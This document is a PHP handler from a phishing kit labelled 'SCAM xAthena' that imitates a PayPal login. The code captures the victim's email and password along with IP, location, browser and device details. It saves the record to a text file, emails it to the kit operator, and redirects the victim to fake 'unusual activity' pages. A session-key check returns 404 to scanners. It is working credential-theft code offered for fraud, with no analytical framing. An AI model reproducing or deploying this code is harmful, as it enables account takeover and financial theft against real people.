<?php
/*
                /$$$$$$  /$$   /$$ /$$   /$$ /$$      /$$  /$$$$$$  /$$   /$$          
               /$$__  $$| $$  | $$| $$$ | $$| $$$    /$$$ /$$__  $$| $$$ | $$          
 /$$  /$$  /$$| $$  \__/| $$  | $$| $$$$| $$| $$$$  /$$$$| $$  \ $$| $$$$| $$ /$$   /$$
| $$ | $$ | $$|  $$$$$$ | $$  | $$| $$ $$ $$| $$ $$/$$ $$| $$$$$$$$| $$ $$ $$|  $$ /$$/
| $$ | $$ | $$ \____  $$| $$  | $$| $$  $$$$| $$  $$$| $$| $$__  $$| $$  $$$$ \  $$$$/ 
| $$ | $$ | $$ /$$  \ $$| $$  | $$| $$\  $$$| $$\  $ | $$| $$  | $$| $$\  $$$  >$$  $$ 
|  $$$$$/$$$$/|  $$$$$$/|  $$$$$$/| $$ \  $$| $$ \/  | $$| $$  | $$| $$ \  $$ /$$/\  $$
 \_____/\___/  \______/  \______/ |__/  \__/|__/     |__/|__/  |__/|__/  \__/|__/  \__/   
 
 SCAM xAthena Edited By xSUNMANx V.1 (2019)
For Any Help Contact Me on Facebook
https://www.facebook.com/rifinha
*/
        session_start(); 
if ($_SESSION['acsh33nz0key'] !== $_POST['acsh33nz0key']) {
	     header('HTTP/1.0 404 Not Found');
}else{
include '../mine.php';
$pas=$_POST['PWD'];
if(isset($_POST['EML'])&&isset($_POST['PWD'])){
$check2 = "true";
if (preg_match("/^(?=.*[0-9]).{8,40}$/",$pas) == true ) {
		$check3 = "true";
	}else{
			$check3 = "false";
		header(("Location: ../../app/signin?invalid"));
		exit();
	}
}
if(isset($_POST['EML'])&&isset($_POST['PWD'])){
if ($check2=="true"&&$check3=="true") {
	$_SESSION['screen']=$_POST['screen'];
	$_SESSION['EML']=$_POST['EML'];
$msg="=========== <[ ".$scamname."- PPL LOGIN ]> ===========\r\n";
$msg.="EMAIL		: {$_POST['EML']}\r\n";
$msg.="PASS		: {$_POST['PWD']}\r\n";
$msg.="---------------------- IP Info ----------------------\r\n";
$msg.="IP ADDRESS	: {$_SESSION['ip']}\r\n";
$msg.="LOCATION	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
$msg.="BROWSER		: {$_SESSION['browser']} on {$_SESSION['os']}\r\n";
$msg.="SCREEN		: {$_SESSION['screen']}\r\n";
$msg.="USER AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
$msg.="TIMEZONE	: {$_SESSION['ip_timezone']}\r\n";
$msg.="TIME		: ".now()." GMT\r\n";
$msg.="========== <[[ ".$scamname."- PPL LOGIN > ===========\r\n\r\n\r\n";
/////////////HERE IS CONFIG SAVE RESULT////////////////
	if ($saveintext=="yes") {
	$save=fopen("../../".$filename.".txt","a+");
	fwrite($save,$msg);
	fclose($save);
	}
///////////////////////////////////////////////////////
	$subject=" ❤😍 PPL LOG!N 😍❤ [".$_POST['EML']."] From [".$_SESSION['ip_countryName']."]";
	$headers="From: xAthena V3 <mohamed6@Brazzers.ma>\r\n";
	$headers.="MIME-Version: 1.0\r\n";
	$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
		if ($sendtoemail=="yes") {
	@mail($yours,$subject,$msg,$headers);
}
		if ($show_unusual_activity=="yes") {
	exit(header("Location: ../../app/unusual_activity"));
}else{
	exit(header("Location: ../../app/process"));
}
}else{
	exit(header("Location: ../../app/mailprovider"));

	}
}else{
	     header('HTTP/1.0 404 Not Found');

}
}
?>